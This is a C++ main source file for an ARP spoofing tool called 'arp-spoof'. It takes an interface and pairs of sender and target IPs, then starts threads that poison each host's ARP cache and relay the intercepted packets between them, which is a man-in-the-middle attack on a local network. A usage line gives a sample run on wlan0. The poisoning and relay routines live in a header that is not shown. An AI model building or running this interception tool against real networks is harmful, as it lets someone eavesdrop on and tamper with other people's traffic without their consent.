#include <cstdio>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>

#include <chrono>
#include <mutex>
#include <thread>
#include <queue>
#include <vector>
#include <map>
#include <utility>
#include <condition_variable>

#include "ethhdr.h"
#include "arphdr.h"
#include "util.h"
#include "attack.h"

static volatile bool running = true;
std::condition_variable cv;

void usage();
void signal_handler(int signal);

int main(int argc, char* argv[]) {
    char *dev;
    Mac attacker_mac;
    Ip attacker_ip;

    std::vector<std::thread> infectors;
    std::vector<std::thread> relayers;
    std::thread receiver;
    std::mutex m;

    IpMap queue_pair;
    
    std::vector<PacketQueue> packet_queue;

    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    dev = argv[1];
    int pair_count = (argc - 2) / 2;

    if (
        getMacFromInterface(dev, &attacker_mac) ||
        getIpFromInterface(dev, &attacker_ip)
    ) {
        fprintf(stderr, "getMacFromInterface or getIpFromInterface error\n");
        return -1;
    }

    signal(SIGINT, signal_handler);

    for (int i = 0; i < pair_count; i++) {
        Ip sender_ip = Ip(argv[i*2+2]);
        Ip target_ip = Ip(argv[i*2+3]);
        Mac sender_mac;
        Mac target_mac;
        if (getMacFromIP(dev, &attacker_mac, &attacker_ip, &sender_ip, &sender_mac)) {
            fprintf(stderr, "getMacFromIP error\n");
            return -1;
        }
        if (getMacFromIP(dev, &attacker_mac, &attacker_ip, &target_ip, &target_mac)) {
            fprintf(stderr, "getMacFromIP error\n");
            return -1;
        }

        int sender_to_target_idx = packet_queue.size();
        queue_pair[std::make_pair(sender_ip, target_ip)] = sender_to_target_idx;
        packet_queue.push_back(PacketQueue());

        int target_to_sender_idx = packet_queue.size();
        queue_pair[std::make_pair(target_ip, sender_ip)] = target_to_sender_idx;
        packet_queue.push_back(PacketQueue());

        infectors.push_back(std::thread(arp_infect, dev, &attacker_mac, &attacker_ip, &sender_mac, &sender_ip, &target_mac, &target_ip, &running));
        relayers.push_back(std::thread(relay_packet, dev, &attacker_mac, &sender_mac, &sender_ip, &target_mac, sender_to_target_idx, target_to_sender_idx, &packet_queue, &running, &m, &cv));
    }

    receiver = std::thread(receive_packet, dev, &running, &packet_queue, &queue_pair, &m, &cv);
    while (running) {}
    cv.notify_all();

    for (int i = 0; i < pair_count; i++) {
        infectors[i].join();
        relayers[i].join();
    }
    receiver.join();

    return 0;
}

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void signal_handler(int signal) {
    running = false;
    cv.notify_all();
    printf("Signal %d received\n", signal);
}
